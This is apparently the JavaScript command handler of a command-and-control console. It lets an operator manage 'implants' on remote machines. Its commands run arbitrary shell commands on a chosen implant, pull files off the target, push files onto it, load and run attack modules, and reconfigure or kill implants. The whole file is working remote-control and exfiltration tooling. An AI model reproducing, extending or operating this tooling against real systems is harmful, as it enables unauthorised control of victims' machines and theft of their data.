function CommandParser(str) {
    var args = [];
    var readingPart = false;
    var quoteStyle = false;
    var part = '';
    for(var i=0; i<str.length;i++){
        if(str.charAt(i) === ' ' && !readingPart) {
            if(part != ''){
                args.push(part);
            }
            part = '';
        } else {
            if( str.charAt(i) === quoteStyle){
                readingPart = !readingPart;
                quoteStyle = false;
            }
            else if((str.charAt(i) === '\"' || str.charAt(i) === '\'') && !readingPart) {
                readingPart = !readingPart;
                quoteStyle = str.charAt(i);
            } else {
                part += str.charAt(i);
            }
        }
    }
    args.push(part);
    return args;
}
function executeCommand(cmd){
    cmdArray = CommandParser(cmd, true);
    cmdArray = cmdArray.filter(function(element) {
        return element !== "";
    });
    if(cmdArray.length == 0){
        return;
    }
    if(cmdArray[0].toLowerCase() == "!implant"){
        cmdArray.splice(1, 0, vars.globalOptions.implant);
        cmdArray[0]="!implants";
    }
    if (cmdArray[0].toLowerCase() == "cd"){
        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: cmdArray.slice(1).join(" "), cmd: "   echo %cd%"}});
    }
    else if (cmdArray[0].toLowerCase() == "!options"){
        printOptions();
    }
    else if (cmdArray[0].toLowerCase() == "!modules"){
        if(cmdArray.length == 1){
            getModules();	
        }
        else if(cmdArray.length > 2 && cmdArray[1].toLowerCase() == "load"){
            modloadService.create({modulePath:cmdArray[2]}).catch((err) => {
                term.printError(err.message);
            });
        }
        else if(cmdArray.length > 2 && cmdArray[2].toLowerCase() == "del"){
            if(vars.modules[cmdArray[1].toLowerCase()]){
                    moduleService.remove(vars.modules[cmdArray[1].toLowerCase()]._id).catch((err) => {
                    term.printError(err.message);
                });
            }else{
                term.printError("Module not found");
            }
        }
    }
    else if(cmdArray[0] == "!run"){
        if(vars.modules[vars.module]){
            modrunService.create({moduleId: vars.modules[vars.module]._id, options: vars.moduleOptions}).catch((err) => {
                    term.printError(err.message);
                });
            }else{
                term.logError("Module not set");
            }
    }
    else if(cmdArray[0] == "!help" || cmdArray[0] == "?"){
        printHelp();
    }
    else if (cmdArray[0].toLowerCase() == "!use"){
        if(cmdArray.length > 1){
            if (vars.modules[cmdArray[1].toLowerCase()] !== undefined){
                vars.module = cmdArray[1].toLowerCase();
                vars.moduleOptions = vars.modules[cmdArray[1].toLowerCase()].options;
                if(vars.moduleOptions.implant && vars.implants[vars.globalOptions.implant]){
                    vars.moduleOptions.implant.value = vars.implants[vars.globalOptions.implant]._id;
                }
                term.setPromptline();
            }else{
                term.logError("Module not found, did you load modules with '!modules load' ?");
            }	
        }
    }
    else if (cmdArray[0].toLowerCase() == "!get"){
        var arr = cmdArray[1].split("\\");
        var filename = arr[arr.length-1];
        arr = filename.split("/");
        filename = arr[arr.length-1];
        console.log(filename);
        fileService.create({filename: filename, chunkSize: parseInt(vars.globalOptions.chunksize), length: 0, metadata:{path:cmdArray[1], uploadedBy: vars.implants[vars.globalOptions.implant]._id }}).then(function(file){
            createJob(vars.globalOptions.implant, {type:"Upload", options:{ file: cmdArray[1], file_id: file._id, chunkSize: parseInt(vars.globalOptions.chunksize), path: vars.globalOptions.path}});
        }).catch((err) => {
            term.printError(err.message);return;
        });
        
    }
    else if (cmdArray[0].toLowerCase() == "!login" && cmdArray.length > 1){
        term.passwordMode = true;
        term.setPromptline();
        console.log(term.promptline);
        vars.user = {email: cmdArray[1]};
    }
    else if (cmdArray[0].toLowerCase() == "!put"){
        if(vars.files[cmdArray[1]] != undefined ||  cmdArray.length < 2){
            var file = cmdArray[2] ? cmdArray[2] : vars.files[cmdArray[1]].filename;
            createJob(vars.globalOptions.implant, {type:"Download", options:{ file: file, file_id: vars.files[cmdArray[1]]._id, length: vars.files[cmdArray[1]].length, chunkSize: vars.files[cmdArray[1]].chunkSize, path: vars.globalOptions.path}});
        }else{
            term.printError("\r\n File not found");
        }
    }
    else if (cmdArray[0].toLowerCase() == "!files"){
        if(cmdArray.length < 2){
            getFiles();
        }else if(cmdArray[1].toLowerCase() == "upload"){
            document.querySelector('input[type=file]').click();
        }
        else if(cmdArray.length == 2){
            if (vars.files[cmdArray[1]] != undefined){
                term.writeln("\r\n" + printFiles({imp:vars.files[cmdArray[1]]}));
                term.prompt();
            }else{
                term.writeln("\r\n File not found");
                term.prompt();
            }
        }
        else if(cmdArray[2] == "del"){
            if (vars.files[cmdArray[1]] != undefined){
                fsService.remove(vars.files[cmdArray[1]]._id);
            }else{
                term.writeln("\r\n File not found");
                term.prompt();
            }
        }else if(cmdArray[2] == "download"){
            if (vars.files[cmdArray[1]] != undefined){
                fileService.get(vars.files[cmdArray[1]]._id).then( function(result) {
                    var arraySize = Math.floor(result.length/result.chunkSize);
                    if (result.length != arraySize * result.chunkSize){
                        arraySize++;
                    }
                    var chunks = new Array(arraySize);
                    var promises = new Array(arraySize);
                    for(var i = 0; i < arraySize; i ++){
                        promises.push(chunkService.find({query: {
                            n: i,
                            files_id: vars.files[cmdArray[1]]._id
                            }}).then( function(result) {
                                chunks[result.data[0].n]=result.data[0].data;
                            }));
                    }
                    Promise.all(promises).then( function(result) {
                                link = document.getElementById("DL");
                                var redirectWindow = window.open('');
                                exportToFile(chunks.join(""), vars.files[cmdArray[1]].filename);									
                            });
                });
            }else{
                term.writeln("\r\n File not found");
            }
        }
    }else if (cmdArray[0].toLowerCase() == "!jobs"){
        if(cmdArray.length < 2){
            getJobs();
        }else{
            if (vars.jobs[cmdArray[1]] != undefined){
                term.writeln("\r\n" + printJobs({imp:vars.jobs[cmdArray[1]]}));
                term.writeln("\r\n" + vars.jobs[cmdArray[1]].result);
            }else{
                term.printError("Job not found");
            }
        }
    }
    else if (cmdArray[0].toLowerCase() == "!implants"){
        if(cmdArray.length < 2){
            getImplants();
        }
        else if(cmdArray.length == 2){
            if (vars.implants[cmdArray[1]] != undefined){
                term.writeln("\r\n" + printImplants({imp:vars.implants[cmdArray[1]]}));
            }else{
                term.printError("Implant not found");
            }
        }
        else if(vars.implants[cmdArray[1]] == undefined){
            term.printError("Implant not found");
        }
        else if(cmdArray[2] == "del"){
            implantService.remove(vars.implants[cmdArray[1]]._id);
        }
        else if(cmdArray[2].toLowerCase() == "kill" || cmdArray[2].toLowerCase() == "exit"){
            createJob(cmdArray[1], {type: "Exit", options: {}});
        }
        else if((cmdArray[2].toLowerCase() == "config" || cmdArray[2].toLowerCase() == "configure")){
            var tmpconfig = {};
            if(cmdArray.length >4 ){
                tmpconfig[cmdArray[3]] = cmdArray[4];
            }
            createJob(cmdArray[1], {type: "Configure", options: {config:tmpconfig}});
        }
    }
    else if (cmdArray[0].toLowerCase() == "!setg" && cmdArray.length > 2){
        vars.globalOptions[cmdArray[1].toLowerCase()] = cmdArray[2];     
    }else if (cmdArray[0].toLowerCase() == "!set" && cmdArray.length > 2){
        if(vars.moduleOptions[cmdArray[1].toLowerCase()] !== undefined){
            if(cmdArray[1].toLowerCase() == "implant"){
                if(vars.implants[cmdArray[2]]){
                    vars.moduleOptions["implant"].value = vars.implants[cmdArray[2]]._id;
                }else{
                    term.printError("Implant not found");
                }
            }else if(cmdArray[1].toLowerCase() == "file"){
                if(vars.files[cmdArray[2]]){
                    vars.moduleOptions["file"].value = vars.files[cmdArray[2]]._id;
                }else{
                    term.printError("File not found");
                }
            }
            else{
                vars.moduleOptions[cmdArray[1].toLowerCase()].value = cmdArray[2];
            }
        }else{
            vars.moduleOptions[cmdArray[1].toLowerCase()] = {value: cmdArray[2], required: false};
        }     
}
    else if (cmdArray[0].toLowerCase() == "!shell" && cmdArray.length > 1){
        vars.globalOptions["implant"]= cmdArray[1];     
    }else if (cmdArray[0].toLowerCase() == "!back"){
        vars.globalOptions["implant"]= "";     
    }
    else if(cmdArray[0].length > 0 && cmd[0] != "!"){
        createJob(vars.globalOptions.implant, {type:"Command", options:{ path: vars.globalOptions.path, cmd: cmd}});
    }else{
        term.printError("Invalid command, type !help for assistance");
    }
}